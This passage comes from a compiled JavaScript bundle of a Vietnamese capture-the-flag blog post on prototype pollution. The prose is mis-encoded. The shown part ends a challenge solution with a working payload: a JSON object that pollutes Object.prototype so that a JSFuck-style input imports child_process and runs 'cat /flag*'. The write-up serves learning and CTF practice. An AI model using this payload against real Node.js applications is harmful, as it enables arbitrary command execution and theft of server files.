<code>Array[&quot;&quot;]</code> l√∫c n√†y kh√¥ng c√≤n l√† undefined. C√°ch s·ª≠a r·∫•t ƒë∆°n gi·∫£n l√† pollute <code>console.log(123)</code> v·ªÅ <code>&quot;constructor&quot;</code>.</p><div class="language-javascript" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token operator">&gt;</span> Array<span class="token punctuation">[</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;console.log(123)&quot;</span></span>\n<span class="line"><span class="token operator">&gt;</span> Array<span class="token punctuation">[</span><span class="token string">&quot;console.log(123)&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;constructor&quot;</span></span>\n<span class="line"></span>\n<span class="line"><span class="token operator">&gt;</span> Array<span class="token punctuation">[</span>Array<span class="token punctuation">[</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;constructor&quot;</span></span>\n<span class="line"></span></code></pre></div><p><img src="' + _imports_17 + '" alt="alt text"> B√¢y gi·ªù ch·ªâ c·∫ßn chuy·ªÉn sang Jsfuck v·ªõi 4 k√≠ t·ª± <code>[]()</code> l√† xong.</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token constant">INPUT_JSON</span> <span class="token operator">=</span> <span class="token punctuation">{</span></span>\n<span class="line">  <span class="token string-property property">&quot;constructor&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token string-property property">&quot;prototype&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span></span>\n<span class="line">      <span class="token string-property property">&quot;&quot;</span><span class="token operator">:</span> <span class="token string">&quot;import(&#39;child_process&#39;).then(a=&gt;a.execSync).then(b=&gt;b(&#39;cat /flag*&#39;)).then(c=&gt;console.log(String(c)))&quot;</span><span class="token punctuation">,</span></span>\n<span class="line">      <span class="token string-property property">&quot;import(&#39;child_process&#39;).then(a=&gt;a.execSync).then(b=&gt;b(&#39;cat /flag*&#39;)).then(c=&gt;console.log(String(c)))&quot;</span><span class="token operator">:</span> <span class="token string">&quot;constructor&quot;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line">  <span class="token punctuation">}</span></span>\n<span class="line"><span class="token punctuation">}</span></span>\n<span class="line"><span class="token constant">INPUT_CODE</span> <span class="token operator">=</span> <span class="token string">&quot;[][[][[][[]]]][[][[][[]]]]([][[]])()&quot;</span></span>\n<span class="line">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token constant">INPUT_JSON</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">INPUT_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>', 22))
  ]);
}
const prototypePollutionBios_html = /* @__PURE__ */ _export_sfc(_sfc_main, [["render", _sfc_render], ["__file", "prototype-pollution-bios.html.vue"]]);
const data = JSON.parse('{"path":"/blogs/CTF/2024/prototype-pollution-bios.html","title":"Prototype Pollution","lang":"en-US","frontmatter":{"title":"Prototype Pollution","date":"2024-05-17T00:00:00.000Z","tags":["Prototype-Pollution","RCE"],"categories":["Research"]},"headers":[{"level":2,"title":"Object trong JavaScript","slug":"object-trong-javascript","link":"#object-trong-javascript","children":[{"level":3,"title":"Object Prototypes","slug":"object-prototypes","link":"#object-prototypes","children":[]},{"level":3,"title":"Protoype chain","slug":"protoype-chain","link":"#protoype-chain","children":[]}]},{"level":2,"title":"Prototype Pollution","slug":"prototype-pollution","link":"#prototype-pollution","children":[{"level":3,"title":"S∆° l∆∞·ª£c","slug":"so-luoc","link":"#so-luoc","children":[]},{"level":3,"title":"Nguy√™n nh√¢n","slug":"nguyen-nhan","link":"#nguyen-nhan","children":[]}]},{"level":2,"title":"Challenge:","slug":"challenge","link":"#challenge","children":[{"level":3,"title":"bi0s/required note","slug":"bi0s-required-note","link":"#bi0s-required-note","children":[]},{"level":3,"title":"seccon13/pp4","slug":"seccon13-pp4","link":"#seccon13-pp4","children":[]}]}],"git":{"createdTime":1734340044000,"updatedTime":1734340044000,"contributors":[{"name":"Phan Nguyen Huy Duy","email":"pnhd.dyh@gmail.com","commits":1}]},"filePathRelative":"blogs/CTF/2024/prototype-pollution-bios.md"}');
export {
  prototypePollutionBios_html as comp,
  data
};
